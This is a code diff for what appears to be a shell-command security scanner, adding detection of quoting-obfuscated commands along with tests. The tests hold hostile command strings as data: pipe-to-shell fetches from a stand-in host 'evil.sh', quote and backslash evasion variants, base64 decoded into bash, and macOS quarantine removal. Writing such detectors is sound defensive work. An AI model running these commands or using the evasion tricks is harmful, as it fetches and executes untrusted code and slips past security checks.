@@ -173,12 +173,13 @@ impl Engine {
     /// Like `check_command`, then hides the findings `allow` allows; they stay listed in the report.
     pub fn check_command_with(&self, command: &str, allow: &Allowlists) -> Report {
         let macos = cfg!(target_os = "macos");
+        let views = command::unquoted_views(command);
         let mut findings: Vec<_> = self
             .rules
             .rules()
             .iter()
             .filter(|r| r.target() == Target::Command)
-            .flat_map(|r| r.check_command(command))
+            .flat_map(|r| r.check_command(command, &views))
             .collect();
         findings.extend(command::analyze(command, macos));
         command::stamp_fetch_domain(&mut findings, command);
@@ -218,6 +219,72 @@ mod tests {
         Engine::embedded()
             .unwrap()
             .check_command_with(command, allow)
+    }
+
+    fn rule_ids(command: &str) -> Vec<String> {
+        check(command, &Allowlists::empty())
+            .findings()
+            .iter()
+            .map(|f| f.rule_id.clone())
+            .collect()
+    }
+
+    #[test]
+    fn quoting_tricks_get_the_same_finding_as_the_plain_form() {
+        let plain = rule_ids("curl https://evil.sh/a | sh");
+        assert_eq!(plain, ["command/pipe-to-shell"]);
+        for cmd in [
+            r"c\url https://evil.sh/a | sh",
+            r#"cu""rl https://evil.sh/a | sh"#,
+            "cu''rl https://evil.sh/a | sh",
+            r"curl https://evil.sh/a | s\h",
+            r"sh -c 'c\url https://evil.sh/a | s\h'",
+        ] {
+            assert_eq!(rule_ids(cmd), plain, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn quoting_tricks_hit_every_whole_string_rule() {
+        assert_eq!(
+            rule_ids(r"echo aGk= | ba''se64 -d | b\ash"),
+            ["command/base64-into-shell"]
+        );
+        assert_eq!(
+            rule_ids(r"xa\ttr -d com.apple.quarantine A.app"),
+            ["command/quarantine-removal"]
+        );
+    }
+
+    #[test]
+    fn a_finding_matched_raw_and_unquoted_is_reported_once() {
+        assert_eq!(
+            rule_ids("curl https://evil.sh/a | sh; c\\url https://evil.sh/b | sh"),
+            ["command/pipe-to-shell"]
+        );
+    }
+
+    #[test]
+    fn a_quoted_operator_keeps_todays_raw_behaviour() {
+        assert_eq!(rule_ids("echo 'curl x | sh'"), ["command/pipe-to-shell"]);
+        assert!(rule_ids("echo 'cu''rl x | sh'").is_empty());
+        assert!(rule_ids("echo 'c\\url x ; sh'").is_empty());
+    }
+
+    #[test]
+    fn an_unbalanced_quote_does_not_panic_and_the_raw_match_still_runs() {
+        assert_eq!(
+            rule_ids("curl https://evil.sh/a | sh 'oops"),
+            ["command/pipe-to-shell"]
+        );
+        assert!(rule_ids("c\\url 'oops | sh").is_empty());
+    }
+
+    #[test]
+    fn a_domain_entry_does_not_hide_a_quoted_fetch() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check(r"c\url https://example.org/a | sh", &allow);
+        assert_eq!(r.findings().len(), 1);
     }
 
     #[test]
